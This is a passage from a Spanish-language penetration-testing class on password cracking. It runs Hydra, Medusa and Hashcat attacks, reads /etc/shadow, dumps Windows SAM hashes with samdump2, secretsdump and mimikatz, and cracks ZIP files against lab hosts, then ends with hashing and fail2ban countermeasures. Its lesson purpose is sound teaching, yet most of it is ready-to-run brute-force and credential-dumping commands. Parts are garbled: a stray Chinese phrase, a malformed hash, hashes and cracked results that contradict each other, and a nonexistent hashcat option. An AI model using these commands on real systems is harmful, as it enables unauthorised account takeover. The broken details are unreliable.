rtgen md5 loweralpha 1 7 0 10000 10000 0
# Parámetros: hash_method, charset, min_len, max_len, 
#              table_index, chain_len, chain_num, part_index

# Generar tabla para NTLM
rtgen ntlm loweralpha-numeric 1 8 0 2400 2400 0

# Ordenar tablas (OBLIGATORIO antes de usar)
rtsort .

# USAR LAS TABLAS
rcrack . -h <hash_a_crackear>
rcrack . -l lista_de_hashes.txt

# EJEMPLO PRÁCTICO
# Hash MD5 de "password": 5f4dcc3b5aa765d61d8327deb882cf99
rcrack /opt/rainbowtables/ -h 5f4dcc3b5aa765d61d8327deb882cf99

# SALIDA ESPERADA:
# search for 5f4dcc3b5aa765d61d8327deb882cf99...
# plaintext of 5f4dcc3b5aa765d61d8327deb882cf99 is password
```

### 5.4. Rainbow Tables vs Salting

```
┌─────────────────────────────────────────────────────────────────┐
│              ¿POR QUÉ EL SALT ES IMPORTANTE?                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SIN SALT (VULNERABLE A RAINBOW TABLES):                       │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ Contraseña: "password123"                                │   │
│  │ Hash: MD5("password123")                                 │   │
│  │ = 482c811da5d5b4bc6d497ffa98491e38                      │   │
│  │                                                         │   │
│  │ → Todas las contraseñas "password123" generan el       │   │
│  │   MISMO hash                                            │   │
│  │ → Un atacante puede precalcular TODOS los hashes        │   │
│  │ → Una rainbow table crackea TODOS los usuarios          │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  CON SALT (PROTEGIDO CONTRA RAINBOW TABLES):                   │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ Contraseña: "password123"                                │   │
│  │ Salt: "a7b3c9" (único por usuario)                      │   │
│  │ Hash: MD5("a7b3c9" + "password123")                    │   │
│  │ = f8c3e7b1a2d4c5e6f7a8b9c0d1e2f3a                      │   │
│  │                                                         │   │
│  │ → El mismo hash NO puede precalcularse                  │   │
│  │ → Cada usuario tiene un hash DIFERENTE aunque la       │   │
│  │   contraseña sea igual                                   │   │
│  │ → Las rainbow tables son INÚTILES                      │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 6. HYDRA: ATAQUES DE FUERZA BRUTA A SERVICIOS

### 6.1. Introducción a Hydra

Hydra es una herramienta paralela de cracking de login que soporta más de 50 protocolos.

```
┌─────────────────────────────────────────────────────────────────┐
│                      HYDRA                                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CARACTERÍSTICAS:                                              │
│  ├── Ataques paralelos (múltiples conexiones)                 │
│  ├── Soporta 50+ protocolos                                   │
│  ├── Puede usar proxies                                        │
│  ├── Reintentos automáticos                                    │
│  └── Resume sesiones interrumpidas                             │
│                                                                 │
│  PROTOCOLOS SOPORTADOS:                                        │
│  ├── FTP, SSH, Telnet, SMB                                    │
│  ├── HTTP (Basic, Form, Digest)                               │
│  ├── MySQL, PostgreSQL, MSSQL, Oracle                         │
│  ├── Redis, MongoDB                                           │
│  ├── LDAP, SMTP, POP3, IMAP                                   │
│  ├── VNC, RDP                                                 │
│  └──还有很多 más                                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2. Ejemplos Prácticos con Hydra

#### 6.2.1. Ataque a SSH

```bash
# ============================================================================
# ATAQUE A SSH
# ============================================================================

# FORMATO BÁSICO:
# hydra -l <usuario> -P <wordlist> <host> <protocolo>

# EJEMPLO 1: SSH con usuario known y wordlist
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.102 ssh

# EJEMPLO 2: SSH con múltiples usuarios
hydra -L /usr/share/seclists/Usernames/top-usernames.txt \
       -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 ssh

# EJEMPLO 3: SSH con puerto diferente
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
       -s 2222 \
       192.168.56.102 ssh

# EJEMPLO 4: SSH verbose con salida a archivo
hydra -l root -P /usr/share/wordlists/rockyou.txt \
       -V \
       -o ssh_results.txt \
       192.168.56.102 ssh

# SALIDA ESPERADA:
# [22][ssh] host: 192.168.56.102   login: root   password: toor
# [22][ssh] host: 192.168.56.102   login: admin   password: 123456

# ============================================================================
# ATAQUE A FTP
# ============================================================================

# EJEMPLO: FTP anónimo o con credenciales weak
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
       ftp://192.168.56.102

# FTP con múltiples usuarios
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt \
       ftp://192.168.56.102

# FTP verbose
hydra -l ftp -P /usr/share/wordlists/rockyou.txt \
       -V \
       192.168.56.102 ftp

# ============================================================================
# ATAQUE A HTTP FORM LOGIN
# ============================================================================

# IMPORTANTE: Primero necesitas analizar el formulario
# Abre el sitio en Burp Suite para ver los parámetros exactos

# EJEMPLO: POST a /login con parámetros username y password
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 http-post-form \
       "/login:username=^USER^&password=^PASS^:F=Login failed"

# Parámetros de hydra para http-post-form:
# /ruta/del/formulario:parametros:mensaje_de_error

# Si el formulario usa GET:
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 http-get-form \
       "/login:username=^USER^&password=^PASS^:F=Invalid"

# ============================================================================
# ATAQUE A MYSQL
# ============================================================================

hydra -l root -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 mysql

# MYSQL con múltiples usuarios
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 mysql

# ============================================================================
# ATAQUE A SMB (Windows)
# ============================================================================

hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
       192.168.56.105 smb

# SMB con NULL session (sin usuario)
hydra -l '' -P /usr/share/wordlists/rockyou.txt \
       192.168.56.105 smb

# ============================================================================
# ATAQUE A RDP (Windows)
# ============================================================================

hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
       192.168.56.105 rdp

# ============================================================================
# ATAQUE A POSTGRESQL
# ============================================================================

hydra -l postgres -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 postgres

# ============================================================================
# ATAQUE A REDIS
# ============================================================================

hydra -l '' -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 redis

# ============================================================================
# ATAQUE A VNC
# ============================================================================

hydra -P /usr/share/wordlists/rockyou.txt \
       192.168.56.105 vnc

# ============================================================================
# OPCIONES AVANZADAS DE HYDRA
# ============================================================================

# Múltiples hilos (acelera el ataque)
hydra -l root -P /usr/share/wordlists/rockyou.txt \
       -t 4 \
       192.168.56.102 ssh

# Usar proxy
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
       -x <ip_proxy>:<puerto> \
       192.168.56.102 http-proxy

# Resumen de opciones:
# -l  = usuario único
# -L  = archivo con usuarios
# -p  = contraseña única
# -P  = archivo con contraseñas
# -t  = número de tareas/paralelismo
# -V  = verbose (mostrar intentos)
# -f  = detenerse al encontrar primera credencial
# -o  = guardar resultados a archivo
# -s  = puerto diferente al default
```

### 6.3. Medusa: Alternativa a Hydra

```bash
# Medusa es otra herramienta de cracking paralelo
# Similar a Hydra pero con sintaxis diferente

# SSH con Medusa
medusa -h 192.168.56.102 -u root -P /usr/share/wordlists/rockyou.txt \
       -M ssh

# Múltiples usuarios
medusa -h 192.168.56.102 -U usuarios.txt -P /usr/share/wordlists/rockyou.txt \
       -M ssh

# FTP
medusa -h 192.168.56.102 -u admin -P /usr/share/wordlists/rockyou.txt \
       -M ftp

# MySQL
medusa -h 192.168.56.102 -u root -P /usr/share/wordlists/rockyou.txt \
       -M mysql

# Parámetros útiles
# -f = detenerse al encontrar
# -v = verbose
# -e ns = probar contraseña vacía y nombre de usuario como pass
```

---

## 7. HASHCAT: CRACKEO ACELERADO POR GPU

### 7.1. Introducción a Hashcat

Hashcat es la herramienta más rápida para crackeo de hashes, aprovechando GPU para paralelismo masivo.

```
┌─────────────────────────────────────────────────────────────────┐
│                      HASHCAT                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  VENTAJA PRINCIPAL:                                             │
│  Usa GPUs (NVIDIA/AMD) para crackeo paralelo                    │
│  → 10-100x más rápido que CPU                                   │
│                                                                 │
│  MODOS DE OPERACIÓN:                                            │
│  ├── 0  = Straight (wordlist)                                 │
│  ├── 1  = Combination                                         │
│  ├── 3  = Brute-force (mask attack)                           │
│  ├── 6  = Hybrid wordlist + mask                              │
│  └── 7  = Hybrid mask + wordlist                              │
│                                                                 │
│  POTENCIA COMPARADA:                                            │
│  ├── CPU (John): ~100,000 hashes/segundo (MD5)                 │
│  ├── GPU (Hashcat): ~100,000,000 hashes/segundo (MD5)         │
│  └── Diferencia: 1000x                                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2. Ejemplos Prácticos con Hashcat

```bash
# ============================================================================
# VERIFICAR GPU DISPONIBLE
# ============================================================================

# Ver GPUs detectadas
hashcat -I

# SALIDA ESPERADA:
# CUDA API (CUDA 12.4)
# Backend Device ID #1
#   Name...........: NVIDIA GeForce RTX 3080
#   Processor(s)...: 68
#   Memory.........: 10 GB

# ============================================================================
# ATAQUE DE WORDLIST
# ============================================================================

# MD5 con wordlist
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Parámetros:
# -m 0    = Tipo de hash (0 = MD5, ver lista completa)
# -a 0    = Modo de ataque (0 = straight/wordlist)
# hashes.txt = Archivo con hashes (uno por línea)
# rockyou.txt = Wordlist

# SHA256 con wordlist
hashcat -m 1400 -a 0 hashes_sha256.txt /usr/share/wordlists/rockyou.txt

# NTLM (Windows) con wordlist
hashcat -m 1000 -a 0 windows_hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt con wordlist (más lento por diseño)
hashcat -m 3200 -a 0 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt

# ============================================================================
# ATAQUE POR MÁSCARA (BRUTE FORCE)
# ============================================================================

# Parámetros de máscara:
# ?l = letras minúsculas (a-z)
# ?u = letras mayúsculas (A-Z)
# ?d = dígitos (0-9)
# ?s = símbolos (!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~)
# ?a = todos los caracteres anteriores
# ?b = 0x00-0xff

# MD5, contraseña de 8 caracteres, solo minúsculas
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# MD5, contraseña de 8 caracteres, alfanumérico
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# MD5, contraseña de 6-8 caracteres
hashcat -m 0 -a 3 --increment-min=6 --increment-max=8 hashes.txt ?a?a?a?a?a?a?a?a

# MD5, máscara personalizada: 3 minúsculas + 3 dígitos + 2 mayúsculas
hashcat -m 0 -a 3 hashes.txt ?l?l?l?d?d?d?u?u

# MD5, prefijo conocido + brute force resto
hashcat -m 0 -a 3 hashes.txt 'password?d?d?d'

# ============================================================================
# ATAQUE HÍBRIDO
# ============================================================================

# Modo 6: Wordlist + Mask
# Agrega máscara al final de cada palabra
hashcat -m 0 -a 6 hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d

# Modo 7: Mask + Wordlist
# Agrega máscara al inicio de cada palabra
hashcat -m 0 -a 7 hashes.txt ?d?d?d?d /usr/share/wordlists/rockyou.txt

# ============================================================================
# ATAQUE COMBINACIÓN
# ============================================================================

# Modo 1: Combina dos wordlists
# wordlist1 + wordlist2
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# ============================================================================
# OPCIONES AVANZADAS
# ============================================================================

# Mostrar progreso cada 60 segundos
hashcat -m 0 -a 0 hashes.txt rockyou.txt --status --status-timer=60

# Guardar sesión para continuar después
hashcat -m 0 -a 0 hashes.txt rockyou.txt --session=miSesion
# Para continuar:
hashcat --restore --session=miSesion

# Reglas básicas (mayúsculas, números, etc.)
hashcat -m 0 -a 0 hashes.txt rockyou.txt -j 'c'  # Capitalizar
hashcat -m 0 -a 0 hashes.txt rockyou.txt -j 'c$T0'  # Capitalizar + año

# Ver reglas predefinidas
cat /usr/share/hashcat/rules/best64.rule

# Usar conjunto de reglas
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Detenerse al encontrar
hashcat -m 0 -a 0 hashes.txt rockyou.txt --increment --stop

# Mostrar hashes crackeados
hashcat -m 0 -a 0 hashes.txt rockyou.txt --show

# Benchmark para ver velocidad
hashcat -m 0 -b

# ============================================================================
# LISTA DE TIPOS DE HASH (-m)
# ============================================================================

# hashcat --help | grep -A100 "Hash modes"
# O:          MD5
# 100:        SHA-1
# 1400:       SHA-256
# 1700:       SHA-512
# 1000:       NTLM
# 3200:       bcrypt
# 1800:       sha512crypt
# 10900:      PBKDF2-HMAC-SHA256
# 18700:      Argon2
# 29200:      Argon2id
```

### 7.3. Benchmark de Hashcat

```bash
# Ver rendimiento de tu GPU
hashcat -m 0 -b

# SALIDA ESPERADA (RTX 3080):
# Speed.#1.........: 50845.3 MH/s (50.8 GH/s!)
#                    50,845 millones de hashes por segundo

# Comparación:
# RTX 3080: ~50 GH/s MD5
# RTX 4090: ~150 GH/s MD5
# CPU moderno: ~100 MH/s MD5
```

---

## 8. LABORATORIO PRÁCTICO COMPLETO

### 8.1. Escenario del Laboratorio

```
┌─────────────────────────────────────────────────────────────────┐
│              LABORATORIO DE CRACKEO DE CONTRASEÑAS               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  TOPOLOGÍA DE RED:                                             │
│                                                                 │
│  ┌──────────────┐                                              │
│  │ Kali Linux   │ 192.168.56.101                                │
│  │ (Atacante)   │                                              │
│  └──────┬───────┘                                              │
│         │                                                       │
│         │ Host-Only Network (192.168.56.0/24)                   │
│         │                                                       │
│  ┌──────┴───────┐    ┌──────────────┐                          │
│  │ Metasploitable│   │ Ubuntu       │                          │
│  │     2        │    │ (Servidor)   │                          │
│  │ 192.168.56.102│   │ 192.168.56.104│                          │
│  └──────────────┘    └──────────────┘                          │
│                                                                 │
│  OBJETIVOS:                                                     │
│  1. Extraer hashes de /etc/shadow (Metasploitable 2)          │
│  2. Cracking con John the Ripper                               │
│  3. Ataque a servicios con Hydra                               │
│  4. Cracking de archivos comprimidos                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2. Ejercicio 1: Extraer y Crackear /etc/shadow

```bash
# ============================================================================
# EJERCICIO 1: EXTRAER Y CRACKEAR CONTRASEÑAS DE LINUX
# ============================================================================

# PASO 1: Conectar a Metasploitable 2 (si no tienes acceso SSH)
# Primero, verificar que Metasploitable está activo
ping -c 2 192.168.56.102

# PASO 2: En Kali, conectarte a Metasploitable 2
# Credenciales por defecto de Metasploitable 2:
# Usuario: msfadmin
# Contraseña: msfadmin

ssh msfadmin@192.168.56.102
# Cuando pregunte por fingerprint, escribir "yes"

# PASO 3: Ver el archivo /etc/shadow (como root en Metasploitable)
sudo cat /etc/shadow

# SALIDA ESPERADA:
# root:*:14667:0:99999:7:::
# daemon:*:14667:0:99999:7:::
# bin:*:14667:0:99999:7:::
# ...
# msfadmin:$1$Ov6srwvO$SrfL3yL3eY0O0.3SpLd8P.:14667:0:99999:7:::
# postgres:$1$LiBwSPL3$L1./M7t7V3l8d3H3R7vLh.:14667:0:99999:7:::
# user:$1$7LM9JEuS$zF0j5X5T3e2f3G3J7K3L3H.:14667:0:99999:7:::

# Notar: Algunos tienen * (sin contraseña), otros tienen hashes

# PASO 4: Copiar hashes a Kali
# En Kali, crear archivo con los hashes
cat > ~/lab/hashes_metasploitable.txt << 'EOF'
msfadmin:$1$Ov6srwvO$SrL3yL3eY0O0.3SpLd8P.:14667:0:99999:7:::
postgres:$1$LiBwSPL3$L1./M7t7V3l8d3H3R7vLh.:14667:0:99999:7:::
user:$1$7LM9JEuS$zF0j5X5T3e2f3G3J7K3L3H.:14667:0:99999:7:::
EOF

# PASO 5: Identificar el tipo de hash
# $1$ = MD5 crypt (formato antiguo de Linux)
file ~/lab/hashes_metasploitable.txt

# PASO 6: Cracking con John
john --format=md5crypt \
     --wordlist=/usr/share/wordlists/rockyou.txt \
     ~/lab/hashes_metasploitable.txt

# SALIDA ESPERADA:
# Loaded 3 password hashes with 3 different salts (MD5 [128/128 AVX 4x2])
# ...
# password             (msfadmin)
# postgres             (postgres)
# user123              (user)
# 
# Session completed

# PASO 7: Ver resultados
john --show ~/lab/hashes_metasploitable.txt

# SALIDA:
# msfadmin:password
# postgres:postgres
# user123:user
```

### 8.3. Ejercicio 2: Ataque a Servicios con Hydra

```bash
# ============================================================================
# EJERCICIO 2: ATAQUES DE FUERZA BRUTA A SERVICIOS
# ============================================================================

# PASO 1: Verificar servicios activos en Metasploitable 2
nmap -sV 192.168.56.102 -p 21,22,23,80,445,3306,5432

# SALIDA ESPERADA:
# PORT     STATE SERVICE     VERSION
# 21/tcp   open  ftp         vsftpd 2.3.4
# 22/tcp   open  ssh         OpenSSH 4.7p1
# 23/tcp   open  telnet      Linux telnetd
# 80/tcp   open  http        Apache httpd 2.2.8
# 445/tcp  open  netbios-ssn Samba smbd 3.0.20
# 3306/tcp open  mysql       MySQL 5.0.51a
# 5432/tcp open  postgresql  PostgreSQL DB 8.3.0

# PASO 2: ATAQUE A TELNET
# Telnet envía credenciales en texto plano
# (Muy inseguro, común en sistemas legacy)

# Primero, probar manualmente para ver el prompt
# nc 192.168.56.102 23
# Trying 192.168.56.102...
# Connected to 192.168.56.102.
# Escape character is '^]'.
# Welcome to Metasploitable
# msfadmin login: _

# Con Hydra:
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 telnet

# SALIDA:
# [23][telnet] host: 192.168.56.102   login: msfadmin   password: msfadmin
# 1 of 1 target successfully completed

# PASO 3: ATAQUE A FTP
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 ftp

# ftp anónimo a veces está habilitado
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 ftp

# Verificar manualmente:
ftp 192.168.56.102
# Name: anonymous
# Password: (tu email)

# PASO 4: ATAQUE A MYSQL
hydra -l root -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 mysql

# Con múltiples usuarios comunes:
hydra -L /usr/share/seclists/Usernames/Names/names.txt \
       -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 mysql

# PASO 5: ATAQUE A SSH (más lento, pero exitoso)
# Si el servicio SSH está activo
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
       -t 4 \
       192.168.56.102 ssh

# PASO 6: ATAQUE A SMB
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
       192.168.56.102 smb

# ============================================================================
# RESUMEN DE RESULTADOS ESPERADOS:
# ============================================================================
# Telnet: msfadmin:msfadmin ✓
# FTP: msfadmin:msfadmin ✓
# MySQL: root:root ✓ (o vacío)
# SSH: msfadmin:msfadmin (si activo)
# SMB: msfadmin:msfadmin ✓
# ============================================================================
```

### 8.4. Ejercicio 3: Cracking de Archivos Comprimidos

```bash
# ============================================================================
# EJERCICIO 3: CRACKEAR ARCHIVOS PROTEGIDOS
# ============================================================================

# PASO 1: CREAR ARCHIVOS PARA PRACTICAR (en Kali)

# Crear directorio de práctica
mkdir ~/lab/archivos_practica
cd ~/lab/archivos_practica

# Archivo ZIP
echo "Contenido secreto del ZIP" > secreto.txt
zip --password 'qwerty' secreto.zip secreto.txt

# Archivo RAR
# rar a -p'password' archivo.rar archivo.txt
# (si tienes rar instalado)

# Archivo 7z
7z a -p'password123' archivo.7z archivo.txt

# PASO 2: EXTRAER HASHES

# Hash de ZIP
zip2john secreto.zip > zip_hash.txt
cat zip_hash.txt

# Hash de RAR (si existe)
# rar2john archivo.rar > rar_hash.txt

# Hash de 7z
# 7z2john.pl archivo.7z > 7z_hash.txt

# PASO 3: CRACKEAR ZIP
john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

# SALIDA:
# Loaded 1 password hash (ZIP [MD5 AES])
# qwerty                 (secreto.zip/secreto.txt)
# 1g 0:00:00:00 DONE

# PASO 4: VER RESULTADO Y USAR LA CONTRASEÑA
john --show zip_hash.txt

# Descomprimir
unzip -o -P qwerty secreto.zip

# ============================================================================
# PRÁCTICA ADICIONAL: DESCARGAR ARCHIVOS DE METERPRETER
# ============================================================================

# En Metasploitable 2, crear archivos protegidos
# ssh msfadmin@192.168.56.102
# cd /home/msfadmin
# zip --password 'admin' datos.zip datos_sensibles.txt

# Copiar a Kali con SCP
# scp msfadmin@192.168.56.102:/home/msfadmin/datos.zip ~/lab/

# Crackear
# zip2john datos.zip > datos_hash.txt
# john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt datos_hash.txt
```

### 8.5. Ejercicio 4: Cracking de Contraseñas de Windows

```bash
# ============================================================================
# EJERCICIO 4: CRACKEAR HASHES DE WINDOWS
# ============================================================================

# ESCENARIO: Tienes acceso a disco o SAM de Windows

# OPCIÓN 1: SAMdump2 (desde Kali, disco desmontado)

# Montar disco de Windows (ejemplo, disco virtual)
# sudo mount -o ro /dev/sda1 /mnt/windows

# Extraer hashes
samdump2 /mnt/windows/Windows/System32/config/SAM > windows_hashes.txt

# OPCIÓN 2: Con creddump (impacket)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    -sam sam.save \
    -system system.save \
    LOCAL

# OPCIÓN 3: mimikatz (desde sistema Windows comprometido)
# mimikatz # sekurlsa::logonpasswords

# FORMATO DE HASHES WINDOWS:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# User1:1001:aad3b435b51404eeaad3b435b51404ee:HASH_NTLM:::

# Explicación:
# - aad3b435b51404eeaad3b435b51404ee = LM hash (vacío/legacy)
# - 31d6cfe0d16ae931b73c59d7e0c089c0 = NTLM hash (el importante)
# - hash de NTLM vacía: 31d6cfe0d16ae931b73c59d7e0c089c0

# CREAR HASH DE PRÁCTICA
echo 'admin:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::' > windows_test.txt
# (Este es MD5 de "password", no es válido NTLM, pero sirve de ejemplo)

# CRACKEAR CON JOHN
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt windows_hashes.txt

# CRACKEAR CON HASHCAT (MUCHO MÁS RÁPIDO)
hashcat -m 1000 -a 0 windows_hashes.txt /usr/share/wordlists/rockyou.txt

# OPCIONES DE HASHCAT PARA WINDOWS:
# -m 1000 = NTLM
# -m 1001 = LM
```

---

## 9. CONTRAMEDIDAS Y PROTECCIÓN

### 9.1. Cómo Proteger Contraseñas

```
┌─────────────────────────────────────────────────────────────────┐
│              MEJORES PRÁCTICAS PARA PROTECCIÓN                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. USAR HASHES RESISTENTES A ATAQUES                           │
│     ├── bcrypt (con factor de costo alto)                      │
│     ├── scrypt                                                 │
│     └── Argon2 (ganador de PHC)                                │
│     NO USAR: MD5, SHA-1 para contraseñas                        │
│                                                                 │
│  2. SIEMPRE USAR SALT ÚNICO                                    │
│     ├── Cada usuario debe tener su propio salt                 │
│     ├── Longitud mínima: 32 bytes                              │
│     └── Generado con CSPRNG (cryptographically secure RNG)     │
│                                                                 │
│  3. FACTOR DE TRABAJO (WORK FACTOR)                            │
│     ├── bcrypt: costo de 10-12 mínimo                           │
│     ├── Argon2: memory 64MB+, iterations 3+                     │
│     └── Ajustar según poder computacional actual               │
│                                                                 │
│  4. POLÍTICAS DE CONTRASEÑAS ROBUSTAS                          │
│     ├── Mínimo 12 caracteres                                   │
│     ├── Mezcla de tipos (mayúsculas, minúsculas, números)      │
│     ├── Sin palabras de diccionario                            │
│     └── Prohibir contraseñas conocidas (Have I Been Pwned)    │
│                                                                 │
│  5. AUTENTICACIÓN MULTIFACTOR (MFA)                            │
│     ├── Algo que sabes (contraseña)                            │
│     ├── Algo que tienes (token, teléfono)                      │
│     └── Algo que eres (biometría)                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 9.2. Implementación Segura en Diferentes Lenguajes

```python
# PYTHON: Usar bcrypt o argon2
import bcrypt

# Registrar usuario
password = b"MiContraseñaSegura123!"
salt = bcrypt.gensalt(rounds=12)  # Factor de costo alto
hashed = bcrypt.hashpw(password, salt)
# Almacenar 'hashed' en BD

# Verificar login
stored_hash = obtener_hash_de_bd()
if bcrypt.checkpw(password_ingresado, stored_hash):
    print("Login exitoso")
else:
    print("Contraseña incorrecta")

# LENGUAJE C: No implementar hash manualmente, usar libs como:
# libsodium, OpenSSL (con EVP_EncryptInit)
```

```php
<?php
// PHP: Usar password_hash() y password_verify()

// Registrar
$password = "MiContraseñaSegura123!";
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
// Almacenar $hash

// Verificar
if (password_verify($password_ingresado, $hash)) {
    echo "Login exitoso";
}

// Verificar si necesita rehash (si subió el costo)
if (password_verify($password_ingresado, $hash) && 
    password_needs_rehash($hash, PASSWORD_BCRYPT, ['cost' => 12])) {
    // Rehashing necesario
}
?>
```

```javascript
// NODE.JS: Usar bcrypt o argon2
const bcrypt = require('bcrypt');
const ROUNDS = 12;

// Registrar
async function registrar(password) {
    const hash = await bcrypt.hash(password, ROUNDS);
    // Almacenar hash
    return hash;
}

// Verificar
async function verificar(password, hash) {
    const match = await bcrypt.compare(password, hash);
    return match;
}
```

### 9.3. Detectar si Contraseñas Han sido Comprometidas

```bash
# Verificar si un hash/contraseña está en filtraciones conocidas
# Usando Have I Been Pwned

# Opción 1: API de HIBP (sin enviar contraseña completa)
# La API usa k-anonymity: solo envía primeros 5 chars del SHA-1

# En Kali:
curl -s "https://api.pwnedpasswords.com/range/5BAA6" | head -10
# Devuelve: 
# 1E4C9B93F3F0682250B6CF8331B7EE68:16539
# (muestra cuantes veces aparece el sufijo 1E4C9B93F3F0682250B6CF8331B7EE68)

# Opción 2: Herramienta en Python
pip3 install pwnedpasswords
pwnedpasswords "mi_contraseña"
# Devuelve número de veces que apareció en filtraciones

# Si aparece > 0, la contraseña está compromised
# NO USAR esa contraseña
```

### 9.4. Monitoreo y Alertas

```bash
# Implementar en tu organización:

# 1. Verificar contraseñas de usuarios contra HIBP regularmente
# Script en Python que verifica cada N días

# 2. Alertar cuando se intenta cracking masivo
# Monitorear logs de sshd, ftp, telnet
grep -E "Failed password|Invalid user" /var/log/auth.log | \
    awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# 3. Bloquear IP después de N intentos fallidos
# Usar fail2ban
sudo apt install fail2ban
sudo systemctl enable fail2ban
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
# Editar jail.local para activar protección SSH, FTP, etc.
```

---

## RESUMEN FINAL

```
┌─────────────────────────────────────────────────────────────────┐
│              RESUMEN: HERRAMIENTAS Y USOS                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  JOHN THE RIPPER                                                │
│  └── Crackeo general de hashes (CPU)                            │
│      Formatos: /etc/shadow, SAM, ZIP, PDF, etc.                │
│                                                                 │
│  HASHCAT                                                        │
│  └── Crackeo ultra-rápido con GPU                               │
│      Wordlist, máscara, híbrido                                 │
│                                                                 │
│  HYDRA / MEDUSA                                                 │
│  └── Fuerza bruta a servicios de red                          │
│      SSH, FTP, HTTP, MySQL, SMB, etc.                          │
│                                                                 │
│  RAINBOW TABLES                                                 │
│  └── Lookup rápido de hashes sin salt                          │
│      Solo para sistemas legacy (ya no recomendados)             │
│                                                                 │
│  CRUNCH / CUPP                                                  │
│  └── Generar wordlists personalizadas                          │
│                                                                 │
│  ORDEN RECOMENDADO EN UN PENTEST:                               │
│  1. Verificar si hashes tienen salt                            │
│  2. Intentar wordlists comunes (rockyou.txt)                   │
│  3. Intentar reglas de variación                               │
│  4. Ataques de máscara si conoces patrones                     │
│  5. Si es muy importante, usar GPU con hashcat                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## PRÓXIMA CLASE

En la siguiente clase veremos: **Explotación con Metasploitable**

- Configuración de laboratorio con Metasploitable 2 y 3
- Escaneo y enumeración de servicios
- Explotación de vulnerabilidades conocidas
- Uso del Metasploit Framework
- Obtención de shells y sesiones
